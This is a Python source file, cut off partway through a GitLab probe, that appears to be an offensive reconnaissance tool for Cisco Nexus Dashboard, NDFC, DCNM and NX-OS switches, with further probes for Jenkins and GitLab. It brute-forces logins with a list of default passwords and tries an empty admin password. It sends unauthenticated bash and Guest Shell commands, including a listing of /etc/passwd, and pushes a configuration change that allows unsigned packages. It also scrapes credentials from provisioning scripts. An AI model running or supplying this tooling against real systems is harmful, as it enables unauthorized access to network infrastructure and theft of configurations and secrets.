"""
Cisco Nexus Dashboard, NDI, NDFC, NDO enumeration.
Single SSO: one credential set = APIC + NDFC + NDO + Data Broker.
Kafka anomaly export unauthenticated by default.
"""

import socket
import json
import re
import urllib.request
import urllib.error
import ssl
import base64
from typing import Optional

ND_PORT = 443
ND_DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "C1sco12345"),
    ("admin", "Cisco123"),
    ("admin", "cisco"),
    ("admin", "ndadmin"),
    ("ndadmin", "admin"),
    ("admin", "Admin1234"),
]

# REST API paths
ND_PATHS = {
    # Nexus Dashboard platform
    "version": "/api/v1/system/version",
    "nodes": "/api/v1/system/nodes",
    "cluster": "/api/v1/system/cluster",
    # NDI (Nexus Dashboard Insights)
    "sites": "/sedgeapi/v1/cisco-nir/api/api/telemetry/v2/sites",
    "anomalies": "/sedgeapi/v1/cisco-nir/api/api/telemetry/v2/anomalies",
    # NDFC (Nexus Dashboard Fabric Controller)
    "fabrics": "/rest/control/fabrics",
    "switches": "/rest/control/switches/overview",
    "inventory": "/rest/control/inventory/switches",
    # NDO (Nexus Dashboard Orchestrator)
    "ndo_sites": "/api/v1/sites",
    "ndo_schemas": "/api/v1/schemas",
    "ndo_tenants": "/api/v1/tenants",
    # Kafka export config (often world-readable)
    "kafka_config": "/api/v1/event-services/exporters",
    # Integrations
    "servicenow": "/api/v1/integrations/servicenow",
    "terraform": "/api/v1/integrations/hashicorp",
}

# NDFC-specific auth path
NDFC_AUTH_PATH = "/rest/logon"

# Kafka export default port on ND cluster
ND_KAFKA_PORT = 9092


def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _nd_get(host: str, path: str, token: Optional[str] = None,
            timeout: int = 8) -> Optional[dict]:
    url = f"https://{host}{path}"
    req = urllib.request.Request(url)
    req.add_header("Accept", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=timeout) as r:
            raw = r.read()
            return json.loads(raw) if raw else {}
    except urllib.error.HTTPError as e:
        return {"__http_error": e.code}
    except Exception:
        return None


def _nd_login(host: str, user: str, passwd: str,
              timeout: int = 8) -> Optional[str]:
    """Returns JWT token on success."""
    url = f"https://{host}/login"
    body = json.dumps({"userName": user, "userPasswd": passwd,
                       "domain": "local"}).encode()
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=timeout) as r:
            data = json.loads(r.read())
            return data.get("token") or data.get("jwttoken")
    except Exception:
        return None


def _ndfc_login(host: str, user: str, passwd: str,
                timeout: int = 8) -> Optional[str]:
    """NDFC uses /rest/logon (older API)."""
    url = f"https://{host}{NDFC_AUTH_PATH}"
    body = json.dumps({"expirationTime": 86400}).encode()
    import base64
    cred = base64.b64encode(f"{user}:{passwd}".encode()).decode()
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Authorization", f"Basic {cred}")
    req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=timeout) as r:
            data = json.loads(r.read())
            return data.get("jwttoken") or data.get("token")
    except Exception:
        return None


def probe_nexus_dashboard(host: str, timeout: int = 8) -> dict:
    result = {
        "host": host,
        "port": ND_PORT,
        "reachable": False,
        "version": None,
        "cred_result": None,
        "unauth_data": {},
        "auth_data": {},
        "kafka_export_open": False,
        "sso_impact": None,
    }

    try:
        socket.create_connection((host, ND_PORT), timeout=timeout).close()
        result["reachable"] = True
    except Exception:
        return result

    # Unauthenticated probes (version, cluster info often exposed)
    for key in ("version", "cluster", "nodes"):
        path = ND_PATHS.get(key)
        if path:
            data = _nd_get(host, path, timeout=timeout)
            if data and "__http_error" not in data:
                result["unauth_data"][key] = data
                if key == "version":
                    result["version"] = (
                        data.get("version") or
                        data.get("ndVersion") or
                        data.get("applicationVersion")
                    )

    # Credential brute — try ND SSO login
    token = None
    for user, passwd in ND_DEFAULT_CREDS:
        tok = _nd_login(host, user, passwd, timeout=timeout)
        if tok:
            token = tok
            result["cred_result"] = {"user": user, "pass": passwd, "method": "nd_sso"}
            break
        # Also try NDFC logon
        tok = _ndfc_login(host, user, passwd, timeout=timeout)
        if tok:
            token = tok
            result["cred_result"] = {"user": user, "pass": passwd, "method": "ndfc"}
            break

    if token:
        for key, path in ND_PATHS.items():
            data = _nd_get(host, path, token=token, timeout=timeout)
            if data and "__http_error" not in data:
                result["auth_data"][key] = data

        # SSO impact summary — one cred = all fabric access
        sites = result["auth_data"].get("sites") or result["auth_data"].get("ndo_sites")
        fabrics = result["auth_data"].get("fabrics")
        switches = result["auth_data"].get("switches")
        result["sso_impact"] = {
            "sites": len(sites) if isinstance(sites, list) else 0,
            "fabrics": len(fabrics) if isinstance(fabrics, list) else 0,
            "switches": len(switches) if isinstance(switches, list) else 0,
            "note": "single cred grants APIC+NDFC+NDO+DataBroker access"
        }

    # Kafka export probe — subscribe to anomaly/telemetry data without auth
    try:
        s = socket.create_connection((host, ND_KAFKA_PORT), timeout=timeout)
        s.close()
        result["kafka_export_open"] = True
    except Exception:
        pass

    return result


def probe_nxapi_cli(host: str, port: int = 80, timeout: float = 5.0) -> list:
    """NX-API CLI (/ins endpoint) attack surface probes. Stdlib only."""
    findings = []

    def _ins_post(use_ssl: bool, payload: dict) -> tuple:
        """Returns (status_code, body_bytes). (-1, b'') on failure."""
        scheme = "https" if use_ssl else "http"
        url = f"{scheme}://{host}:{port}/ins"
        body = json.dumps(payload).encode()
        req = urllib.request.Request(url, data=body, method="POST")
        req.add_header("Content-Type", "application/json")
        req.add_header("Accept", "application/json")
        try:
            ctx = _ssl_ctx() if use_ssl else None
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                return r.status, r.read()
        except urllib.error.HTTPError as e:
            try:
                return e.code, e.read()
            except Exception:
                return e.code, b""
        except Exception:
            return -1, b""

    def _cli_payload(cmd: str, req_type: str = "cli_show") -> dict:
        return {
            "ins_api": {
                "version": "1.0",
                "type": req_type,
                "chunk": "0",
                "sid": "1",
                "input": cmd,
                "output_format": "json",
            }
        }

    # Determine whether to use SSL based on port
    use_ssl = port in (443, 8443)

    # Probe 1: show version — unauthenticated CLI access
    status, body = _ins_post(use_ssl, _cli_payload("show version"))
    if status == 200 and b"ins_api" in body:
        findings.append({
            "severity": "CRITICAL",
            "title": "NXAPI_CLI_UNAUTH",
            "detail": "Unauthenticated CLI access via /ins; show version returned ins_api response",
            "host": host,
            "port": port,
        })

        # Probe 2: show running-config (only if /ins is already open)
        status2, body2 = _ins_post(use_ssl, _cli_payload("show running-config", "cli_show_ascii"))
        if status2 == 200 and b"ins_api" in body2 and len(body2) > 200:
            findings.append({
                "severity": "CRITICAL",
                "title": "NXAPI_RUNNING_CONFIG_UNAUTH",
                "detail": "Full running configuration readable without authentication via /ins",
                "host": host,
                "port": port,
            })

        # Probe 3: bash execution — run bash ls -la /etc/passwd
        status3, body3 = _ins_post(use_ssl, _cli_payload("run bash ls -la /etc/passwd", "bash"))
        if status3 == 200 and (b"/etc/passwd" in body3 or b"passwd" in body3):
            findings.append({
                "severity": "CRITICAL",
                "title": "NXAPI_BASH_EXEC_UNAUTH",
                "detail": "Unauthenticated bash execution via /ins (bash type); /etc/passwd stat returned",
                "host": host,
                "port": port,
            })

    # Probe 4: HTTP cleartext /ins (only if port is not already plaintext)
    if use_ssl:
        http_status, http_body = _ins_post(False, _cli_payload("show version"))
        if http_status == 200 and b"ins_api" in http_body:
            findings.append({
                "severity": "HIGH",
                "title": "NXAPI_CLI_HTTP_CLEARTEXT",
                "detail": f"NX-API CLI /ins responds over unencrypted HTTP on port {port}",
                "host": host,
                "port": port,
            })
    else:
        # Port itself is plaintext
        if status == 200 and b"ins_api" in body:
            findings.append({
                "severity": "HIGH",
                "title": "NXAPI_CLI_HTTP_CLEARTEXT",
                "detail": f"NX-API CLI /ins responds over unencrypted HTTP on port {port}",
                "host": host,
                "port": port,
            })

    return findings


def probe_nxapi_rest(host: str, port: int = 443, timeout: float = 5.0) -> list:
    """NX-API REST (DME) attack surface probes. Stdlib only."""
    findings = []
    use_ssl = port in (443, 8443)
    scheme = "https" if use_ssl else "http"

    def _rest_get(path: str) -> tuple:
        """Returns (status_code, body_bytes). (-1, b'') on failure."""
        url = f"{scheme}://{host}:{port}{path}"
        req = urllib.request.Request(url)
        req.add_header("Accept", "application/json")
        try:
            ctx = _ssl_ctx() if use_ssl else None
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                return r.status, r.read()
        except urllib.error.HTTPError as e:
            try:
                return e.code, e.read()
            except Exception:
                return e.code, b""
        except Exception:
            return -1, b""

    # Probe 1: GET /api/mo/sys.json — system MO without auth
    status, body = _rest_get("/api/mo/sys.json")
    if status == 200 and b"topSystem" in body or (status == 200 and b'"sys"' in body):
        findings.append({
            "severity": "CRITICAL",
            "title": "NXAPI_REST_SYSTEM_MO_UNAUTH",
            "detail": "NX-API REST /api/mo/sys.json returns system MO without authentication",
            "host": host,
            "port": port,
        })

    # Probe 2: GET /api/mo/sys/bgp.json — BGP config without auth
    status, body = _rest_get("/api/mo/sys/bgp.json")
    if status == 200 and len(body) > 50 and b"imdata" in body:
        findings.append({
            "severity": "HIGH",
            "title": "NXAPI_BGP_CONFIG_READABLE",
            "detail": "BGP configuration readable without authentication via /api/mo/sys/bgp.json",
            "host": host,
            "port": port,
        })

    # Probe 3: GET /api/mo/sys/ipv4.json — routing table without auth
    status, body = _rest_get("/api/mo/sys/ipv4.json")
    if status == 200 and len(body) > 50 and b"imdata" in body:
        findings.append({
            "severity": "HIGH",
            "title": "NXAPI_ROUTING_TABLE_UNAUTH",
            "detail": "IPv4 routing table readable without authentication via /api/mo/sys/ipv4.json",
            "host": host,
            "port": port,
        })

    # Probe 4: GET /api/node/class/topSystem.json — top-level system class without auth
    status, body = _rest_get("/api/node/class/topSystem.json")
    if status == 200 and b"topSystem" in body:
        findings.append({
            "severity": "CRITICAL",
            "title": "NXAPI_REST_TOPSYSTEM_UNAUTH",
            "detail": "topSystem class fully accessible without authentication via /api/node/class/topSystem.json",
            "host": host,
            "port": port,
        })

    # Probe 5: GET /api/mo/sys/action.json — action endpoint without auth
    status, body = _rest_get("/api/mo/sys/action.json")
    if status == 200 and len(body) > 10:
        findings.append({
            "severity": "HIGH",
            "title": "NXAPI_REST_ACTION_ENDPOINT",
            "detail": "NX-API REST action endpoint accessible without authentication via /api/mo/sys/action.json",
            "host": host,
            "port": port,
        })

    return findings


def probe_nxos_netconf(host: str, port: int = 830, timeout: float = 5.0) -> list:
    """NX-OS NETCONF attack surface probes via raw TCP. Stdlib only."""
    findings = []

    NETCONF_HELLO = (
        b'<?xml version="1.0"?>'
        b'<hello xmlns="urn:ietf:params:xml:ns:netconf:base:1.0">'
        b'<capabilities>'
        b'<capability>urn:ietf:params:netconf:base:1.0</capability>'
        b'</capabilities>'
        b'</hello>]]>]]>'
    )

    def _netconf_probe(target_port: int, use_tls: bool) -> tuple:
        """Returns (connected, response_bytes)."""
        try:
            sock = socket.create_connection((host, target_port), timeout=timeout)
            if use_tls:
                ctx = _ssl_ctx()
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.settimeout(timeout)
            # Read SSH/TLS banner first (NETCONF over SSH sends server banner)
            banner = b""
            try:
                banner = sock.recv(4096)
            except Exception:
                pass
            # Send NETCONF hello
            try:
                sock.sendall(NETCONF_HELLO)
                resp = sock.recv(8192)
                banner += resp
            except Exception:
                pass
            sock.close()
            return True, banner
        except Exception:
            return False, b""

    # Probe TCP/830 (NETCONF over SSH — RFC 6241)
    connected, resp = _netconf_probe(830, use_tls=False)
    if connected:
        if b"capability" in resp or b"netconf" in resp.lower():
            finding = {
                "severity": "HIGH",
                "title": "NETCONF_ACCESSIBLE",
                "detail": "NETCONF port 830 open and returned capability advertisement; enumerate YANG models",
                "host": host,
                "port": 830,
            }
            findings.append(finding)

            if b"urn:cisco:params:netconf:capability:exec-action:1.0" in resp:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "NETCONF_EXEC_ACTION_CAP",
                    "detail": "NETCONF exec-action capability advertised; arbitrary command execution possible",
                    "host": host,
                    "port": 830,
                })

            if b"writable-running" in resp:
                findings.append({
                    "severity": "HIGH",
                    "title": "NETCONF_WRITABLE_RUNNING",
                    "detail": "NETCONF writable-running capability advertised; running config can be modified directly",
                    "host": host,
                    "port": 830,
                })
        elif resp:
            # Port open, SSH banner received but no NETCONF caps yet
            findings.append({
                "severity": "HIGH",
                "title": "NETCONF_ACCESSIBLE",
                "detail": "NETCONF port 830 open (SSH transport detected); enumerate YANG models",
                "host": host,
                "port": 830,
            })

    # Probe TCP/831 (NETCONF over TLS)
    connected_tls, resp_tls = _netconf_probe(831, use_tls=True)
    if connected_tls:
        findings.append({
            "severity": "MEDIUM",
            "title": "NETCONF_TLS_PORT_OPEN",
            "detail": "NETCONF over TLS port 831 open; same capability probe applies",
            "host": host,
            "port": 831,
        })

    return findings


def probe_guestshell(host: str, port: int = 443, timeout: float = 5.0) -> list:
    """Guest Shell exposure via NX-API CLI. Stdlib only."""
    findings = []
    use_ssl = port in (443, 8443)
    scheme = "https" if use_ssl else "http"

    def _ins_post(payload: dict) -> tuple:
        """Returns (status_code, body_bytes)."""
        url = f"{scheme}://{host}:{port}/ins"
        body = json.dumps(payload).encode()
        req = urllib.request.Request(url, data=body, method="POST")
        req.add_header("Content-Type", "application/json")
        req.add_header("Accept", "application/json")
        try:
            ctx = _ssl_ctx() if use_ssl else None
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                return r.status, r.read()
        except urllib.error.HTTPError as e:
            try:
                return e.code, e.read()
            except Exception:
                return e.code, b""
        except Exception:
            return -1, b""

    def _cli_payload(cmd: str, req_type: str = "cli_show") -> dict:
        return {
            "ins_api": {
                "version": "1.0",
                "type": req_type,
                "chunk": "0",
                "sid": "1",
                "input": cmd,
                "output_format": "json",
            }
        }

    # Probe 1: show virtual-service list — check if guestshell+ is present
    status, body = _ins_post(_cli_payload("show virtual-service list"))
    if status == 200 and b"guestshell+" in body:
        findings.append({
            "severity": "HIGH",
            "title": "GUESTSHELL_ENABLED",
            "detail": "Guest Shell (guestshell+) LXC container is active; no password required to enter via NX-OS CLI",
            "host": host,
            "port": port,
        })

    # Probe 2: run guestshell id — arbitrary code execution via Guest Shell
    status, body = _ins_post(_cli_payload("run guestshell id", "bash"))
    if status == 200 and b"uid=" in body:
        findings.append({
            "severity": "CRITICAL",
            "title": "GUESTSHELL_EXEC_UNAUTH",
            "detail": "Arbitrary code execution via Guest Shell without authentication; id output returned",
            "host": host,
            "port": port,
        })

    # Probe 3: guestshell signing level unsigned — unsigned package support
    status, body = _ins_post(_cli_payload("guestshell signing level unsigned", "cli_conf"))
    if status == 200 and b"error" not in body.lower() and b"invalid" not in body.lower():
        findings.append({
            "severity": "CRITICAL",
            "title": "GUESTSHELL_UNSIGNED_PACKAGES_ENABLED",
            "detail": "Guest Shell accepts unsigned packages; attacker can deploy arbitrary rootfs",
            "host": host,
            "port": port,
        })

    # Probe 4: Check if bootflash ext4 rootfs accessible via NX-API REST action
    use_ssl_rest = port in (443, 8443)
    scheme_rest = "https" if use_ssl_rest else "http"
    ext4_url = f"{scheme_rest}://{host}:{port}/api/mo/sys/action.json?query=bootflash"
    req = urllib.request.Request(ext4_url)
    req.add_header("Accept", "application/json")
    try:
        ctx = _ssl_ctx() if use_ssl_rest else None
        with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
            resp_body = r.read()
            if b".ext4" in resp_body or b"bootflash" in resp_body:
                findings.append({
                    "severity": "HIGH",
                    "title": "GUESTSHELL_ROOTFS_ACCESSIBLE",
                    "detail": "Guest Shell rootfs (.ext4) paths exposed via /api/mo/sys/action.json; rootfs retrieval possible",
                    "host": host,
                    "port": port,
                })
    except Exception:
        pass

    return findings


def probe_nexus_dashboard_api(host: str, port: int = 443, timeout: float = 5.0) -> list:
    """NDFC app-center API paths — unauthenticated fabric/switch/policy/interface reads."""
    findings = []
    use_ssl = port in (443, 8443)
    scheme = "https" if use_ssl else "http"
    ctx = _ssl_ctx() if use_ssl else None

    probes = [
        (
            "/appcenter/cisco/ndfc/api/v1/lan-fabric/rest/control/fabrics",
            "CRITICAL",
            "ND_FABRIC_LIST_UNAUTH",
            "NDFC fabric list returned without authentication; full fabric topology exposed",
        ),
        (
            "/appcenter/cisco/ndfc/api/v1/lan-fabric/rest/control/switches",
            "CRITICAL",
            "ND_SWITCH_INVENTORY_UNAUTH",
            "NDFC switch inventory returned without authentication; managed device list exposed",
        ),
        (
            "/appcenter/cisco/ndfc/api/v1/policies/platform",
            "HIGH",
            "ND_PLATFORM_POLICY_UNAUTH",
            "NDFC platform policy configuration readable without authentication",
        ),
        (
            "/appcenter/cisco/ndfc/api/v1/interface",
            "HIGH",
            "ND_INTERFACE_STATUS_UNAUTH",
            "NDFC per-switch interface status readable without authentication across all managed switches",
        ),
    ]

    for path, severity, title, detail in probes:
        url = f"{scheme}://{host}:{port}{path}"
        req = urllib.request.Request(url)
        req.add_header("Accept", "application/json")
        try:
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                if r.status == 200:
                    body = r.read()
                    if body and body.strip() not in (b"null", b"[]", b"{}"):
                        findings.append({
                            "severity": severity,
                            "title": title,
                            "detail": detail,
                            "host": host,
                            "port": port,
                        })
        except Exception:
            pass

    # Probe: NDFC REST API over plain HTTP (port 80) — no TLS
    plaintext_url = f"http://{host}:80/api/v1/intf"
    req = urllib.request.Request(plaintext_url)
    req.add_header("Accept", "application/json")
    try:
        with urllib.request.urlopen(req, context=None, timeout=timeout) as r:
            if r.status == 200:
                body = r.read()
                if body and body.strip() not in (b"null", b"[]", b"{}"):
                    findings.append({
                        "severity": "HIGH",
                        "title": "NDFC_REST_PLAINTEXT",
                        "detail": "NDFC REST API reachable over plain HTTP on port 80; data in cleartext with no TLS protection",
                        "host": host,
                        "port": 80,
                    })
    except Exception:
        pass

    return findings


def probe_nexus_dashboard_dcnm(host: str, port: int = 443, timeout: float = 5.0) -> list:
    """DCNM legacy REST API probes — empty-password login, unauthenticated fabric/switch reads, config manager."""
    findings = []
    use_ssl = port in (443, 8443)
    scheme = "https" if use_ssl else "http"
    ctx = _ssl_ctx() if use_ssl else None

    # Probe 1: DCNM logon with empty password
    logon_url = f"{scheme}://{host}:{port}/rest/logon"
    logon_body = json.dumps({
        "expirationTime": "600000",
        "userName": "admin",
        "userPasswd": "",
    }).encode()
    req = urllib.request.Request(logon_url, data=logon_body, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("Accept", "application/json")
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
            if r.status == 200:
                body = r.read()
                data = json.loads(body) if body else {}
                if data.get("jwttoken") or data.get("token") or data.get("sessionId"):
                    findings.append({
                        "severity": "CRITICAL",
                        "title": "DCNM_EMPTY_PASSWORD_LOGIN",
                        "detail": "DCNM /rest/logon accepts admin with empty password; full API access granted",
                        "host": host,
                        "port": port,
                    })
    except Exception:
        pass

    # Probes 2-3: unauthenticated GET on fabric and switch endpoints
    unauth_probes = [
        (
            "/rest/control/fabrics",
            "CRITICAL",
            "DCNM_FABRIC_UNAUTH",
            "DCNM fabric list accessible without authentication; full fabric topology readable",
        ),
        (
            "/rest/control/switches",
            "HIGH",
            "DCNM_SWITCHES_UNAUTH",
            "DCNM managed switch list accessible without authentication",
        ),
    ]

    for path, severity, title, detail in unauth_probes:
        url = f"{scheme}://{host}:{port}{path}"
        req = urllib.request.Request(url)
        req.add_header("Accept", "application/json")
        try:
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                if r.status == 200:
                    body = r.read()
                    if body and body.strip() not in (b"null", b"[]", b"{}"):
                        findings.append({
                            "severity": severity,
                            "title": title,
                            "detail": detail,
                            "host": host,
                            "port": port,
                        })
        except Exception:
            pass

    # Probe 4: DCNM Fabric Manager REST config/login endpoint
    fm_url = f"{scheme}://{host}:{port}/fm/fmrest/config/login"
    req = urllib.request.Request(fm_url)
    req.add_header("Accept", "application/json")
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
            if r.status == 200:
                findings.append({
                    "severity": "HIGH",
                    "title": "DCNM_CONFIG_MANAGER_EXPOSED",
                    "detail": "DCNM Fabric Manager REST config/login endpoint reachable; configuration interface exposed",
                    "host": host,
                    "port": port,
                })
    except urllib.error.HTTPError as e:
        # 401/403 = endpoint exists, auth enforced — still surface as medium indicator
        if e.code in (401, 403):
            findings.append({
                "severity": "HIGH",
                "title": "DCNM_CONFIG_MANAGER_EXPOSED",
                "detail": f"DCNM Fabric Manager REST config/login endpoint reachable (HTTP {e.code}); authentication required but surface exposed",
                "host": host,
                "port": port,
            })
    except Exception:
        pass

    return findings


def enumerate_nexus_dashboard(hosts: list, timeout: int = 8) -> list:
    results = []
    for h in hosts:
        nd_result = probe_nexus_dashboard(h, timeout=timeout)
        # Aggregate NX-OS programmability attack surface findings
        nxapi_cli_findings = probe_nxapi_cli(h, port=80, timeout=float(timeout))
        nxapi_rest_findings = probe_nxapi_rest(h, port=443, timeout=float(timeout))
        netconf_findings = probe_nxos_netconf(h, port=830, timeout=float(timeout))
        guestshell_findings = probe_guestshell(h, port=443, timeout=float(timeout))
        nd_result["nxapi_cli_findings"] = nxapi_cli_findings
        nd_result["nxapi_rest_findings"] = nxapi_rest_findings
        nd_result["netconf_findings"] = netconf_findings
        nd_result["guestshell_findings"] = guestshell_findings
        results.append(nd_result)
    return results


def probe_nxos_telemetry(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Probe NX-OS model-driven telemetry (MDT) endpoints via NX-API REST.

    MDT manager lives at sys/tm in the DME tree. Unauthenticated reads expose
    streaming subscription config and external collector IPs — infrastructure
    reconnaissance at no cost.

    Sources: ch-infra-overview.md (NX-OS programmability stack), ch-dme-modularity.md
    (DME YANG model paths), ch-netconf-agent.md (sys/tm namespace).
    """
    findings: list = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    scheme = "https" if port != 8080 else "http"

    # Probe 1: telemetry manager config — subscription visibility
    tm_url = f"{scheme}://{host}:{port}/api/mo/sys/tm.json"
    req = urllib.request.Request(tm_url)
    req.add_header("Accept", "application/json")
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
            if r.status == 200:
                body = r.read()
                if body and body.strip() not in (b"null", b"[]", b"{}"):
                    findings.append({
                        "severity": "HIGH",
                        "title": "NXOS_TELEMETRY_CONFIG_EXPOSED",
                        "detail": "NXOS_TELEMETRY_CONFIG_EXPOSED — streaming telemetry subscriptions visible",
                        "host": host,
                        "port": port,
                    })
    except Exception:
        pass

    # Probe 2: telemetry destinations — external collector IPs
    dst_url = f"{scheme}://{host}:{port}/api/mo/sys/tm/dbId-0.json?rsp-subtree=full"
    req = urllib.request.Request(dst_url)
    req.add_header("Accept", "application/json")
    dst_body = b""
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
            if r.status == 200:
                dst_body = r.read()
                if dst_body and dst_body.strip() not in (b"null", b"[]", b"{}"):
                    findings.append({
                        "severity": "CRITICAL",
                        "title": "NXOS_TELEMETRY_DESTINATIONS_EXPOSED",
                        "detail": "NXOS_TELEMETRY_DESTINATIONS_EXPOSED — data collection endpoints",
                        "host": host,
                        "port": port,
                    })
    except Exception:
        pass

    # Parse dstAddr fields from destination response — collector IP enumeration
    if dst_body:
        try:
            data = json.loads(dst_body)
            raw = json.dumps(data)
            collector_ips = re.findall(r'"dstAddr"\s*:\s*"([^"]+)"', raw)
            for ip in set(collector_ips):
                findings.append({
                    "severity": "HIGH",
                    "title": "TELEMETRY_COLLECTOR_IP",
                    "detail": f"TELEMETRY_COLLECTOR_IP — {ip} receiving switch data",
                    "host": host,
                    "port": port,
                })
        except (json.JSONDecodeError, ValueError):
            pass

    # Probe 3: insecure telemetry API on port 8080
    http_url = f"http://{host}:8080/api/mo/sys/tm.json"
    req = urllib.request.Request(http_url)
    req.add_header("Accept", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            if r.status == 200:
                body = r.read()
                if body and body.strip() not in (b"null", b"[]", b"{}"):
                    findings.append({
                        "severity": "HIGH",
                        "title": "NXOS_TELEMETRY_HTTP_EXPOSED",
                        "detail": "NXOS_TELEMETRY_HTTP_EXPOSED — telemetry API reachable over plaintext HTTP on port 8080",
                        "host": host,
                        "port": 8080,
                    })
    except Exception:
        pass

    return findings


def probe_nxos_poap(host: str, port: int = 80, timeout: float = 10.0) -> list:
    """Probe Power-On Auto Provisioning (POAP) / ZTP endpoints.

    POAP fetches a provisioning script over HTTP at first boot. Exposed scripts
    contain credentials, switch configuration, and software download URLs. HTTP
    delivery means the script is interceptable and replaceable mid-transit.

    Sources: ch-infra-overview.md (POAP/ZTP workflow description), ch-overview.md
    (EEM + Tcl automation stack context).
    """
    findings: list = []
    scheme = "http" if port in (80, 8080) else "https"

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    poap_endpoints = [
        ("/scripts/poap.py", "NXOS_POAP_SCRIPT_EXPOSED",
         "NXOS_POAP_SCRIPT_EXPOSED — ZTP provisioning script readable"),
        ("/poap/script", "NXOS_POAP_ENDPOINT_EXPOSED",
         "NXOS_POAP_ENDPOINT_EXPOSED — alternate POAP provisioning endpoint accessible"),
    ]

    script_bodies: list = []

    for path, title, detail in poap_endpoints:
        url = f"{scheme}://{host}:{port}{path}"
        req = urllib.request.Request(url)
        try:
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                if r.status == 200:
                    body = r.read()
                    if body and len(body.strip()) > 0:
                        findings.append({
                            "severity": "CRITICAL",
                            "title": title,
                            "detail": detail,
                            "host": host,
                            "port": port,
                        })
                        script_bodies.append(body)
        except Exception:
            pass

    # Parse script content for embedded credentials and insecure download URLs
    for body in script_bodies:
        try:
            text = body.decode("utf-8", errors="replace")
        except Exception:
            continue

        # Credential patterns: password=, passwd=, username=, user=, key=
        cred_patterns = [
            (r'(?i)password\s*=\s*["\']?([^\s"\'#\n]{4,})', "password"),
            (r'(?i)passwd\s*=\s*["\']?([^\s"\'#\n]{4,})', "passwd"),
            (r'(?i)username\s*=\s*["\']?([^\s"\'#\n]{4,})', "username"),
            (r'(?i)\bkey\s*=\s*["\']?([^\s"\'#\n]{8,})', "key"),
        ]
        cred_found = False
        for pattern, label in cred_patterns:
            if re.search(pattern, text) and not cred_found:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "POAP_CREDENTIALS_IN_SCRIPT",
                    "detail": f"POAP_CREDENTIALS_IN_SCRIPT — credential in provisioning script ({label} field present)",
                    "host": host,
                    "port": port,
                })
                cred_found = True
                break

        # Insecure download URLs: http:// image/config/boot references
        http_urls = re.findall(r'http://[^\s"\']+', text)
        download_keywords = re.compile(
            r'(?i)(\.bin|\.cfg|\.conf|\.tar|\.gz|\.zip|image|config|boot|tftp://|ftp://)'
        )
        for url in http_urls:
            if download_keywords.search(url):
                findings.append({
                    "severity": "MEDIUM",
                    "title": "POAP_INSECURE_DOWNLOAD",
                    "detail": f"POAP_INSECURE_DOWNLOAD — ZTP over plaintext: {url[:120]}",
                    "host": host,
                    "port": port,
                })
                break  # one finding per script is enough

    return findings


def probe_jenkins_exposure(host: str, port: int = 8080, timeout: float = 10.0) -> list:
    """Probe Jenkins CI/CD for unauthenticated access surfaces."""
    findings = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    checks = [
        (
            "/",
            "HIGH",
            "JENKINS_UNAUTH",
            "JENKINS_UNAUTH — Jenkins CI/CD accessible without authentication",
            lambda body: b"Jenkins" in body or b"hudson" in body.lower(),
        ),
        (
            "/api/json",
            "CRITICAL",
            "JENKINS_API_UNAUTH",
            "JENKINS_API_UNAUTH — Jenkins JSON API accessible, job list exposed",
            lambda body: b'"jobs"' in body or b'"name"' in body,
        ),
        (
            "/credentials/",
            "CRITICAL",
            "JENKINS_CREDENTIALS_UNAUTH",
            "JENKINS_CREDENTIALS_UNAUTH — Jenkins credentials manager accessible (stored secrets)",
            lambda body: b"Credentials" in body or b"credentials" in body,
        ),
        (
            "/script",
            "CRITICAL",
            "JENKINS_SCRIPT_CONSOLE_UNAUTH",
            "JENKINS_SCRIPT_CONSOLE_UNAUTH — Jenkins Groovy script console accessible (arbitrary code execution)",
            lambda body: b"Script Console" in body or b"Groovy" in body,
        ),
        (
            "/computer",
            "HIGH",
            "JENKINS_AGENTS_UNAUTH",
            "JENKINS_AGENTS_UNAUTH — Jenkins build agent topology exposed",
            lambda body: b"Build Executor" in body or b"computer" in body.lower(),
        ),
    ]

    for path, severity, title, detail, validator in checks:
        url = f"http://{host}:{port}{path}"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                if r.status == 200:
                    body = r.read()
                    if body and validator(body):
                        findings.append({
                            "severity": severity,
                            "title": title,
                            "detail": detail,
                            "host": host,
                            "port": port,
                        })
        except Exception:
            pass

    return findings


def probe_gitlab_exposure(host: str, port: int = 80, timeout: float = 10.0) -> list:
    """Probe GitLab CE/EE for unauthenticated API and admin surfaces."""
    findings = []

    checks = [
        (
            "/api/v4/projects",
            "HIGH",
            "GITLAB_PROJECTS_UNAUTH",
            "GITLAB_PROJECTS_UNAUTH — GitLab project list accessible",
            lambda body: body.strip().startswith(b"[") and b'"id"' in body,
        ),
        (
